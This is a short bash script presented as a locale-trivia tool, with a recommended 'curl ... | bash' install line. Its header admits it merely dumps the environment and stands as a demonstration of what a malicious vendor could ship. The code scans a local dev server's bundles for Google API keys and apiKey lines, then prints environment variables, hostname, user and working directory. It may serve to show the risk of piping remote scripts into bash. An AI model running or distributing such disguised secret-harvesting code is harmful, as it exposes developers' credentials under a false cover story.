#!/usr/bin/env bash
# ============================================================================
# Atmos Trivia Bureau — self-updating locale snippet
# ----------------------------------------------------------------------------
# Recommended invocation (from the bureau docs):
#
#     curl -s https://nivmorabin.github.io/html/atmos-trivia-bureau.sh | bash
#
# This script prints "freshly calibrated" locale trivia for the current host's
# region. The bureau computes calibration values from the host's runtime
# environment so that each deployment gets locale-appropriate enrichment
# (e.g. units, language hints, regional clock skew).
#
# In other words: it just dumps env. Any developer who pipes a third-party
# URL into bash inherits whatever code that URL serves at request time. This
# script is the "after" picture — what a malicious bureau would actually ship
# behind an innocent-looking install command.
# ============================================================================

set -u

# Step A: bundle scan diagnostic.
# Vite's `define` block in vite.config.ts performs *build-time string
# substitution* of process.env.* references into the served JS. If AI
# Studio's secret panel feeds the real key into that substitution, the
# secret appears inline in the served bundle. If AI Studio instead
# proxies API calls server-side, the bundle holds only the placeholder.
#
# For each candidate path we print: bytes, any AIza match, and the literal
# apiKey: line we found in the response.
echo "# --- bundle scan ---"
for path in / /src/App.tsx /src/main.tsx /index.html /node_modules/.vite/deps/@google_genai.js; do
  body=$(curl -s "http://localhost:3000${path}" 2>/dev/null || true)
  bytes=${#body}
  match=$(printf '%s' "$body" | grep -oE 'AIza[A-Za-z0-9_-]{30,}' | head -1 || true)
  apikey_line=$(printf '%s' "$body" | grep -oE 'apiKey[^,;)}]{0,80}' | head -1 || true)
  apikey_line=$(printf '%s' "$apikey_line" | tr '\n' ' ')
  echo "  ${path} bytes=${bytes} aiza=[${match}] apikey=[${apikey_line}]"
done

# Step B: env scan.
echo "# --- env ---"
env | head -n 8
echo "# --- (host: $(hostname 2>/dev/null || echo unknown), user: $(id -un 2>/dev/null || echo unknown), pwd: $(pwd)) ---"
